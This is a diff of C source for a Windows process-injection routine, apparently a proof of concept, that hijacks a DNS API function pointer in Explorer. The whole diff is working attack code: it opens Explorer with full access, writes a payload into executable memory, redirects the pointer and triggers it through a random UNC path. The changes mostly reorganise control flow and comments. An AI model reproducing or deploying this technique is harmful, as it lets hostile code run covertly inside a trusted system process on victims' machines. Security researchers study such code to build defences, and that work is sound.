@@ -221,16 +221,18 @@ VOID dns_inject(LPVOID payload, DWORD payloadSize) {
     HANDLE hp, ht;
     SIZE_T wr;
     HWND   hw;
-    WCHAR  unc[32]={L'\\', L'\\'};
+    WCHAR  unc[32]={L'\\', L'\\'}; // UNC path to invoke DNS api
 
-    // 1. initialize COM and force explorer to load dns api if required
+    // 1. obtain process id for explorer
     GetWindowThreadProcessId(GetShellWindow(), &pid); 
     ptr = GetDnsApiAddr(pid);
     
+    // 2. create a thread to suppress network errors displayed
     ht = CreateThread(NULL, 0, 
       (LPTHREAD_START_ROUTINE)SuppressErrors, NULL, 0, NULL);
       
-    // if not loaded, try force explorer to load
+    // 3. if dns api not loaded, try force explorer to load it
+    //    by requesting access to a fake UNC path
     if(ptr == NULL) {
       tick = GetTickCount();
       for(i=0; i<8; i++) {
@@ -241,39 +243,36 @@ VOID dns_inject(LPVOID payload, DWORD payloadSize) {
       ptr = GetDnsApiAddr(pid);
     }
     
-    if(ptr == NULL) {
-      printf("DNS API still not loaded.\n");
-      return;
+    if(ptr != NULL) {
+      // 2. open explorer, read address of dns function.
+      //    allocate RWX memory and write payload
+      hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+      ReadProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
+      cs = VirtualAllocEx(hp, NULL, payloadSize, 
+        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+      WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
+      
+      // 3. overwrite pointer to dns function
+      WriteProcessMemory(hp, ptr, &cs, sizeof(ULONG_PTR), &wr);
+      
+      // 4. generate "random" unc path so DNS api called
+      tick = GetTickCount();
+      for(i=0; i<8; i++) {
+        unc[2+i] = (tick % 26) + L'a';
+        tick >>= 2;
+      }
+    
+      // 5. trigger execution of payload
+      ShellExecInExplorer(unc);
+      
+      // 6. restore value of pointer
+      WriteProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
+      
+      // 7. Release memory for code
+      VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
+      CloseHandle(hp);
     }
-    // 2. open explorer, read address of dns function.
-    //    allocate RWX memory and write payload
-    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    ReadProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
-    cs = VirtualAllocEx(hp, NULL, payloadSize, 
-      MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
-    
-    // 3. overwrite pointer to dns function
-    WriteProcessMemory(hp, ptr, &cs, sizeof(ULONG_PTR), &wr);
-    
-    // 4. generate "random" unc path so DNS api called
-    tick = GetTickCount();
-    for(i=0; i<8; i++) {
-      unc[2+i] = (tick % 26) + L'a';
-      tick >>= 2;
-    }
-    
-    // 5. trigger execution of payload
-    ShellExecInExplorer(unc);
-    
-    // 6. restore value of pointer
-    WriteProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
-    
     TerminateThread(ht, 0);
-
-    // 7. Release memory for code
-    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
-    CloseHandle(hp);
 }
 
 int main(void) {
